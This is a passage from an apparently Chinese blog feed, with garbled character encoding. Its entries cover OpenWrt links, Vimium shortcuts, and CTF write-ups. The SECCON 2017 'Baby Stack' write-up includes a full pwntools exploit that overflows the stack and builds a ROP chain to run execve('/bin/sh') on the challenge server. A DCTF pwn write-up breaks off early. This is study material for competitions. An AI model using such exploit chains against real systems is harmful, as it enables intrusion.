title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><p><a href="http://www.openwrt.pro/post-207.html">http://www.openwrt.pro/post-207.html</a><br><a href="http://www.wzero.net/?p=137">http://www.wzero.net/?p=137</a><br><a href="http://shumeipai.nxez.com/2015/07/28/install-openwrt-will-be-transformed-into-a-versatile-router-raspberry-pi.html">http://shumeipai.nxez.com/2015/07/28/install-openwrt-will-be-transformed-into-a-versatile-router-raspberry-pi.html</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Raspberry </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hhkb é”®ç›˜çš„ç†Ÿæ‚‰ä»¥åŠç»™chrome  æµè§ˆå™¨å®‰è£…viminumæ’ä»¶</title>
      <link href="hhkb_with_chrome.html"/>
      <url>hhkb_with_chrome.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>emmm<br> ä¸€ä¸ªå¤§å¤§å¸ˆå‚…é€äº†æˆ‘ä¸€ä¸ªhhkbé”®ç›˜</p><p>ç„¶åçªç„¶æƒ³ç»™chromeæµè§ˆå™¨è£…ä¸€ä¸ªæ’ä»¶ã€‚ã€‚viminum</p><h1 id="Vimium-å¸¸ç”¨çš„æŒ‰é”®åŠŸèƒ½è§£é‡Š"><a href="#Vimium-å¸¸ç”¨çš„æŒ‰é”®åŠŸèƒ½è§£é‡Š" class="headerlink" title="Vimium å¸¸ç”¨çš„æŒ‰é”®åŠŸèƒ½è§£é‡Š"></a>Vimium å¸¸ç”¨çš„æŒ‰é”®åŠŸèƒ½è§£é‡Š</h1><p>Jï¼šå‘ä¸‹ç»†å¾®æ»šåŠ¨çª—å£   kï¼šå‘ä¸Šç»†å¾®æ»šåŠ¨çª—å£<br>Jï¼š(Shift+jçš„æ„æ€ï¼Œä»¥ä¸‹å¤§å†™å…¨éƒ¨è¡¨ç¤ºåŠ Shift) ä¸‹ä¸€ä¸ªæ ‡ç­¾é¡µ  Kï¼šä¸Šä¸€ä¸ªæ ‡ç­¾é¡µ<br>dï¼šå‘ä¸‹æ»šåŠ¨åŠä¸ªå±å¹•   uï¼šå‘ä¸Šç§»åŠ¨åŠä¸ªå±å¹•<br>g+gï¼ˆè¿ç»­æŒ‰ä¸¤ä¸‹gï¼‰ï¼šå›åˆ°é¡¶éƒ¨<br>Gï¼šåˆ°è¾¾é¡µé¢åº•éƒ¨<br>Hï¼šåé€€   Lï¼š å‰è¿›<br>fï¼šå°†å½“å‰ç½‘é¡µä¸Šçš„æ‰€æœ‰å¯è§é“¾æ¥/è¾“å…¥æ¡†åˆ†é…ä¸€ä¸ªå¿«æ·é”®ï¼Œè¾“å…¥åå°±å¯ä»¥æ‰“å¼€æˆ–è€…è·³è½¬åˆ°å¯¹åº”çš„è¾“å…¥æ¡†ã€‚å¦‚æœæŒ‰çš„æ˜¯Fï¼Œé‚£ä¹ˆå°†åœ¨æ–°çª—å£ä¸­æ‰“å¼€é¡µé¢ï¼ˆè§ä¸Šå›¾ï¼‰<br>g+iï¼šå°†å…‰æ ‡ å®šä½åˆ°è¾“å…¥æ¡†ï¼Œå¦‚æœæœ‰å¤šä¸ªå¯ä»¥æŒ‰Tabé”®åˆ‡æ¢<br>xï¼šå…³é—­å½“å‰é¡µé¢   Xï¼šæ¢å¤åˆšåˆšå…³é—­çš„é¡µé¢<br>oï¼šç›¸å½“äºChromeä¸­çš„åœ°å€æ ï¼Œå¯ä»¥åŒ¹é…å†å²è®°å½•ã€æ”¶è—å¤¹å¹¶åœ¨å½“å‰çª—å£æ‰“å¼€ï¼Œæˆ–è€…ç›´æ¥æ‰“å¼€ä¸€ä¸ªç½‘å€æˆ–è€…æœç´¢ä¸€ä¸ªå…³é”®å­—ï¼ˆChromeåœ¨å…¨å±çš„æ—¶å€™åœ°å€æ æ­»éƒ½å‡ºä¸æ¥ï¼Œæœ‰äº†å®ƒå°±è§£å†³è¿™ä¸ªä¸€ç›´å›°æ‰°æˆ‘çš„é—®é¢˜äº†ï¼ï½ï¼‰ï¼Œå¦‚æœæŒ‰çš„æ˜¯Oï¼Œåˆ™å¯ä»¥åœ¨æ–°çª—å£ä¸­æ‰“å¼€ï¼Œéå¸¸éå¸¸æ–¹ä¾¿ï¼<br>g+sï¼šæŸ¥çœ‹ç½‘é¡µçš„æºä»£ç <br>rï¼šé‡æ–°è½½å…¥å½“å‰ç½‘é¡µï¼ˆé¡ºä¾¿æä¸€å¥ï¼Œè¿™ç‚¹ä¸Šæ–°æµªå¾®åšå’Œå®ƒæ˜¯ä¸€æ ·çš„ï¼Œå…‰æ ‡æ²¡æœ‰å®šä½åœ¨å‘é€æ¡†æ—¶ï¼Œå³ä¾¿æ²¡æœ‰å®‰è£…è¿™ä¸ªæ’ä»¶ä½ ä¹Ÿå¯ä»¥ç”¨j/kæ¥æ§åˆ¶é¡µé¢ä¸Šä¸‹æ»šåŠ¨ï¼Œç”¨råœ¨åˆ·æ–°ï¼Œç”¨fæˆ–è€…pæ¥å®šä½åˆ°å‘é€æ¡†ã€‚è€ŒGmailçš„å¿«æ·é”®å¦‚j,kä¸Šä¸‹ç§»åŠ¨å…‰æ ‡ä¹Ÿæ˜¯ç±»ä¼¼ï¼Œæœ‰å…´è¶£å¤§å®¶å¯ä»¥å†è‡ªå·±å»äº†è§£ä¸€ä¸‹ä¸€äº›å¸¸ç”¨webåº”ç”¨çš„å¿«æ·é”®ï¼‰</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> ç¯å¢ƒé…ç½® </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SECCON 2017 Online CTF</title>
      <link href="2017-SECCON-OnlineCTF.html"/>
      <url>2017-SECCON-OnlineCTF.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-seccon-result.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-seccon-result.jpg"></a></p><h1 id="Baby-Stack"><a href="#Baby-Stack" class="headerlink" title="Baby Stack"></a>Baby Stack</h1><p>ä¸€ä¸ªç®€å•çš„ç¼“å†²åŒºæº¢é¢˜ç›®ï¼Œç¨‹åºç”±go è¯­è¨€ç¼–å†™è€Œæˆï¼Œæ‰€ä»¥å¹¶ä¸èƒ½ç›´æ¥F5å»åˆ†æã€‚</p><h2 id="analysis"><a href="#analysis" class="headerlink" title="analysis"></a>analysis</h2><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-seccon-babystack-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-seccon-babystack-01.jpg"></a></p><p>ç¨‹åºçš„<code>main_memcpy</code>å­˜åœ¨æ¼æ´ï¼Œå¯å‘ç”Ÿæ ˆæº¢å‡º</p><p>åœ¨è°ƒè¯•çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¼šå‘ç°ä¸€ä¸ªä¸ä¸€æ ·çš„åœ°æ–¹<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-seccon-babystack-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-seccon-babystack-02.jpg"></a></p><p>æ­£å¸¸ï¼Œæˆ‘ä»¬éƒ½æ˜¯ripå‚¨å­˜ç€è¿”å›åœ°å€ï¼Œè€Œè¿™ç¡®å®rspå­˜å‚¨çš„ï¼Œè¿™å°±æ„å‘³ç€å‡½æ•°å…¥å£æ—¶çš„rspæŒ‡å‘retnåœ°å€ï¼Œä¸‹é¢è·Ÿç€å‚æ•°</p><p>å¦å¤–è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœæ˜¯åªæ˜¯å•çº¯çš„<code>&quot;A&quot;*192+p64(ret)</code>ç¨‹åºæ˜¯ä¼šæŠ¥é”™çš„ï¼Œ</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-seccon-babystack-03.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-seccon-babystack-03.jpg"></a></p><p>åœ¨<code>call main_memcpy </code>ç»“æŸåï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸¤æ¡æ±‡ç¼–</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004012A4                 mov     rbx, [rsp+1f8h+name.str]</span><br><span class="line">.text:00000000004012AC                 mov     [rsp+1F8h+var_E0], rbx</span><br><span class="line">.text:00000000004012B4                 mov     rbx, [rsp+1f8h+name.len]</span><br></pre></td></tr></table></figure><p>æœ‰ä¸¤æ¡æ ˆæ“ä½œï¼Œå¯¹è±¡åˆ†åˆ«æ˜¯nameçš„å­—ç¬¦ä¸²ä»¥åŠä¸€ä¸ªnameçš„é•¿åº¦ï¼Œäºæ˜¯æˆ‘ä»¬æ„é€ ä¸€ä¸ª<br><code>payload = &quot;B&quot; * 104 + p64(0x0000000000599940) + p64(0x200) + &quot;D&quot; * 8</code></p><p>é‚£ä¹ˆå‰©ä¸‹çš„äº‹æƒ…åªè¦æ„é€  rop-chainå°±è¡Œäº†<br>æ€è·¯å¦‚ä¸‹ï¼Œæ„é€ ä¸€ä¸ªread è¯»å…¥ /bin/sh , è¯»å…¥åœ°å€åœ¨bssä¸Šï¼Œç„¶åæ„é€  execve å»æ‰§è¡Œ /bin/sh</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, time</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal =[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.binary = <span class="string">&quot;./baby_stack&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    p = process([<span class="string">&quot;./baby_stack&quot;</span>])</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;baby_stack.pwn.seccon.jp&quot;</span>, <span class="string">&quot;15285&quot;</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x000000000059f920</span></span><br><span class="line">syscall = <span class="number">0x0000000000456889</span>    <span class="comment"># syscall; ret;</span></span><br><span class="line">pop_rax_ret = <span class="number">0x00000000004016ea</span>    <span class="comment"># pop rax; ret;</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000046defd</span>    <span class="comment"># pop rsi; ret;</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000470931</span>    <span class="comment"># pop rdi; or byte ptr [rax + 0x39], cl; ret;</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x00000000004a247c</span>    <span class="comment"># pop rdx; or byte ptr [rax - 0x77], cl; ret;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name &gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;A&quot;</span> * <span class="number">0x100</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;message &gt;&gt; &quot;</span>)</span><br><span class="line">raw_input(<span class="string">&#x27;---- debug ----&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;B&quot;</span>*<span class="number">104</span>+<span class="string">&#x27;\0&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x200</span>)</span><br><span class="line">payload = <span class="string">&quot;B&quot;</span> * <span class="number">104</span> + p64(<span class="number">0x0000000000599940</span>) + p64(<span class="number">0x200</span>) + <span class="string">&quot;D&quot;</span> * <span class="number">8</span></span><br><span class="line">payload += <span class="string">&quot;C&quot;</span> * <span class="number">0x48</span> + p64(syscall) + p64(<span class="number">0x200</span>)</span><br><span class="line">payload += <span class="string">&quot;E&quot;</span> * (<span class="number">0x80</span> + <span class="number">0x40</span>)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(bss)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>)        <span class="comment"># read</span></span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rax_ret) + p64(bss)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">59</span>)  <span class="comment"># __NR_execve</span></span><br><span class="line">payload += p64(syscall)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;&#x27;&#x27;break *0x40129F</span></span><br><span class="line"><span class="string">break *0x401465&#x27;&#x27;&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="JPEG-file"><a href="#JPEG-file" class="headerlink" title="JPEG file"></a>JPEG file</h2><p>JPEG file<br>Read this JPEG is broken.<br>It will be fixed if you change somewhere by 1 bit.</p><p><a href="https://www.imagemagick.org/script/identify.php">https://www.imagemagick.org/script/identify.php</a><br>ç”¨è¿™çš„å·¥å…·å»æ£€æµ‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">magick identify -verbose tktk.jpg</span><br><span class="line">Image: tktk.jpg</span><br><span class="line">  Format: JPEG (Joint Photographic Experts Group JFIF format)</span><br><span class="line">  Mime <span class="built_in">type</span>: image/jpeg</span><br><span class="line">  Class: DirectClass</span><br><span class="line">  Geometry: 339x53+0+0</span><br><span class="line">  Resolution: 192x192</span><br><span class="line">  Print size: 1.76562x0.276042</span><br><span class="line">  Units: PixelsPerInch</span><br><span class="line">  Type: Grayscale</span><br><span class="line">  Base <span class="built_in">type</span>: TrueColor</span><br><span class="line">  Endianess: Undefined</span><br><span class="line">  Colorspace: sRGB</span><br><span class="line">  Depth: 8-bit</span><br><span class="line">  Channel depth:</span><br><span class="line">    Gray: 8-bit</span><br><span class="line">  Channel statistics:</span><br><span class="line">    Pixels: 17967</span><br><span class="line">    Gray:</span><br><span class="line">      min: 99  (0.388235)</span><br><span class="line">      max: 153 (0.6)</span><br><span class="line">      mean: 128.001 (0.501966)</span><br><span class="line">      standard deviation: 0.796015 (0.00312163)</span><br><span class="line">      kurtosis: 879.955</span><br><span class="line">      skewness: 0.249206</span><br><span class="line">      entropy: 0.0271321</span><br><span class="line">  Colors: 14</span><br><span class="line">  Histogram:</span><br><span class="line">         4: ( 99, 99, 99) <span class="comment">#636363 grey39</span></span><br><span class="line">         4: (113,113,113) <span class="comment">#717171 srgb(113,113,113)</span></span><br><span class="line">         4: (115,115,115) <span class="comment">#737373 grey45</span></span><br><span class="line">         4: (117,117,117) <span class="comment">#757575 grey46</span></span><br><span class="line">         4: (121,121,121) <span class="comment">#797979 srgb(121,121,121)</span></span><br><span class="line">        16: (126,126,126) <span class="comment">#7E7E7E gray</span></span><br><span class="line">        28: (127,127,127) <span class="comment">#7F7F7F grey50</span></span><br><span class="line">     17799: (128,128,128) <span class="comment">#808080 fractal</span></span><br><span class="line">        68: (129,129,129) <span class="comment">#818181 srgb(129,129,129)</span></span><br><span class="line">         4: (130,130,130) <span class="comment">#828282 grey51</span></span><br><span class="line">         8: (131,131,131) <span class="comment">#838383 srgb(131,131,131)</span></span><br><span class="line">        12: (132,132,132) <span class="comment">#848484 srgb(132,132,132)</span></span><br><span class="line">         4: (137,137,137) <span class="comment">#898989 srgb(137,137,137)</span></span><br><span class="line">         8: (153,153,153) <span class="comment">#999999 grey60</span></span><br><span class="line">  Rendering intent: Perceptual</span><br><span class="line">  Gamma: 0.454545</span><br><span class="line">  Chromaticity:</span><br><span class="line">    red primary: (0.64,0.33)</span><br><span class="line">    green primary: (0.3,0.6)</span><br><span class="line">    blue primary: (0.15,0.06)</span><br><span class="line">    white point: (0.3127,0.329)</span><br><span class="line">  Matte color: grey74</span><br><span class="line">  Background color: white</span><br><span class="line">  Border color: srgb(223,223,223)</span><br><span class="line">  Transparent color: none</span><br><span class="line">  Interlace: None</span><br><span class="line">  Intensity: Undefined</span><br><span class="line">  Compose: Over</span><br><span class="line">  Page geometry: 339x53+0+0</span><br><span class="line">  Dispose: Undefined</span><br><span class="line">  Iterations: 0</span><br><span class="line">  Compression: JPEG</span><br><span class="line">  Quality: 95</span><br><span class="line">  Orientation: Undefined</span><br><span class="line">  Properties:</span><br><span class="line">    date:create: 2017-12-12T15:19:55+08:00</span><br><span class="line">    date:modify: 2017-12-09T22:18:51+08:00</span><br><span class="line">    jpeg:colorspace: 2</span><br><span class="line">    jpeg:sampling-factor: 2x2,1x1,1x1</span><br><span class="line">    signature: be9fd7cce707a16b630c1db97798b1f402a0dd2da77fb636cc8e2647abcc768e</span><br><span class="line">  Artifacts:</span><br><span class="line">    verbose: <span class="literal">true</span></span><br><span class="line">  Tainted: False</span><br><span class="line">  Filesize: 11628B</span><br><span class="line">  Number pixels: 17967</span><br><span class="line">  Pixels per second: 898351B</span><br><span class="line">  User time: 0.010u</span><br><span class="line">  Elapsed time: 0:01.019</span><br><span class="line">  Version: ImageMagick 7.0.7-14 Q16 x86_64 2017-12-07 http://www.imagemagick.org</span><br><span class="line">identify: Corrupt JPEG data: premature end of data segment `tktk.jpg<span class="string">&#x27; @ warning/jpeg.c/JPEGWarningHandler/365.</span></span><br><span class="line"><span class="string">identify: Unsupported marker type 0xfc `tktk.jpg&#x27;</span> @ warning/jpeg.c/JPEGErrorHandler/329.</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°é”™è¯¯çš„å­—èŠ‚æ˜¯ 0xfc<br>ç”±äºæ ‡è®°ä»¥0xFFå¼€å¤´ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ‰¾åˆ°FF FCï¼Œå¹¶åœ¨0xFFä¸­æ”¹å˜ä¸€äº›ä½ä»¥åˆ é™¤è¯¥æ— æ•ˆæ ‡è®°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ swingdeMacBook-Pro in ~/MyCTF/SECCON/re/jpg-file [15:23:57]</span></span><br><span class="line">$ binwalk -R <span class="string">&quot;\xFF\xFC&quot;</span> tktk.jpg</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">623           0x26F           \xFF\xFC</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç¡®å®šåç§»å å°±æ˜¯æš´åŠ›å‡ºå¥‡è¿¹çš„æ—¶å€™äº†</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">&quot;./tktk&quot;</span>)</span><br><span class="line">origin = f.read()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">byte =  <span class="number">623</span></span><br><span class="line">bit = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    <span class="comment">#if(raw_input() == &quot;b&quot;):</span></span><br><span class="line">    <span class="comment">#    break</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Byte, bit: %d, %d&quot;</span> % (byte, bit)</span><br><span class="line">    content = origin[:byte] + chr(ord(origin[byte]) ^ (<span class="number">1</span> &lt;&lt; bit)) + origin[byte+<span class="number">1</span>:]</span><br><span class="line">    outfile = open(<span class="string">&quot;./tktkout.jpg&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">    outfile.write(content)</span><br><span class="line">    outfile.close()</span><br><span class="line">    bit += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(bit == <span class="number">8</span>):</span><br><span class="line">        bit = <span class="number">0</span></span><br><span class="line">        byte += <span class="number">1</span></span><br><span class="line">    os.system(<span class="string">&quot;/Users/xxx/.iterm2/imgcat ./tktkout.jpg&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>[[â€˜Tâ€™, â€˜hâ€™, â€˜eâ€™, â€˜qâ€™, â€˜uâ€™, â€˜iâ€™, â€˜câ€™], [â€˜kâ€™, â€˜bâ€™, â€˜râ€™, â€˜oâ€™, â€˜wâ€™, â€˜nâ€™, â€˜fâ€™], [â€˜oâ€™, â€˜xâ€™, â€˜jâ€™, â€˜uâ€™, â€˜mâ€™, â€˜pâ€™, â€˜sâ€™], [â€˜oâ€™, â€˜vâ€™, â€˜eâ€™, â€˜râ€™, â€˜tâ€™, â€˜hâ€™, â€˜eâ€™], [â€˜lâ€™, â€˜aâ€™, â€˜zâ€™,â€™yâ€™, â€˜dâ€™, â€˜oâ€™, â€˜gâ€™]]</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SECCON </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shanghai-DCTF-2017 çº¿ä¸‹æ”»é˜²Pwné¢˜</title>
      <link href="2017-Shanghai-DCTF-final-pwn.html"/>
      <url>2017-Shanghai-DCTF-final-pwn.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>Shanghai-DCTF-2017 çº¿ä¸‹æ”»é˜²Pwné¢˜  â€“åˆ©ç”¨c++å¼‚å¸¸æœºåˆ¶ç»•è¿‡canaryæ£€æŸ¥ï¼Œæ–‡ç« é¦–å‘äº360å®‰å…¨å®¢ã€<a href="https://www.anquanke.com/post/id/89855%E3%80%91">https://www.anquanke.com/post/id/89855ã€‘</a></p><p>é¢˜ç›®å’Œå®Œæ•´çš„expå¯ä»¥ä»è¿™é‡Œè·å–<a href="https://pan.baidu.com/s/1nuNQC9z">é“¾æ¥</a></p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><h3 id="ç°åœºå…¥å‘"><a href="#ç°åœºå…¥å‘" class="headerlink" title="ç°åœºå…¥å‘"></a>ç°åœºå…¥å‘</h3><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-finla-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-finla-01.jpg"></a></p><p>èœå•æ ä¸­ä¸€å…±æœ‰äº”ä¸ªé€‰é¡¹ï¼Œå…¶ä¸­æœ€å®¹æ˜“å¼•èµ·æˆ‘ä»¬æ³¨æ„çš„å°±æ˜¯é€‰é¡¹4ï¼Œ<strong>test security</strong>ï¼Œåœ¨è¿™ä¸ªå‡½æ•°é‡Œæœ‰ä¸‰ä¸ªæ¼æ´</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-02.jpg"></a></p><p>åˆ†åˆ«æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ ã€æ ˆæº¢å‡ºã€å †æº¢å‡ºï¼Œ<br>1.æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-03.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-03.jpg"></a></p><p>æ ¼å¼åŒ–ä¸²ä¸å¯æ§<br>2.æ ˆæº¢å‡º</p><p><a 